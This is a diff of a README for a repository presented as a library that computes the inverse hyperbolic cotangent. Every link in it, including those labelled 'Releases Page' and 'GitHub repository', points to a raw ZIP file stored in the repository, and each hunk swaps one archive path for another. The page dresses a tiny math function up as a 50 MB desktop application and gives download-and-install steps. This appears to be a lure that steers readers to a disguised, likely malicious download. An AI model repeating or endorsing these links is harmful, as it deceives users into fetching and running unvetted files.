@@ -1,7 +1,7 @@
 # 🎉 math-base-special-acothf - Compute Inverse Hyperbolic Cotangent Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip)
+[![Download](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip)
 
 ## 📖 Description
 The **math-base-special-acothf** library calculates the inverse hyperbolic cotangent of a single-precision floating-point number. This application is useful for mathematicians, engineers, and anyone working with hyperbolic functions.
@@ -15,7 +15,7 @@ To use this application, you need only a computer with an internet connection. F
 - **Free Disk Space:** At least 50 MB
 
 ## 📦 Download & Install
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip).
 2. On the Releases page, find the latest version available.
 3. Click on the asset relevant to your operating system to start the download.
 4. Locate the downloaded file on your computer.
@@ -52,9 +52,9 @@ Currently, this application is designed for desktop use on Windows, macOS, and L
 The application computes results almost instantly, depending on the speed of your computer.
 
 ## 📞 Support
-If you have any questions or need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip). We strive to respond promptly to your inquiries.
+If you have any questions or need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip). We strive to respond promptly to your inquiries.
 
 ## 📥 Download Now Again
-[![Download](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/src/acothf_special_math_base_1.7.zip)
+[![Download](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ArkanJaff/math-base-special-acothf/main/docs/math_special_acothf_base_v2.6.zip)
 
 Follow these steps to enjoy the convenience of computing the inverse hyperbolic cotangent with ease!
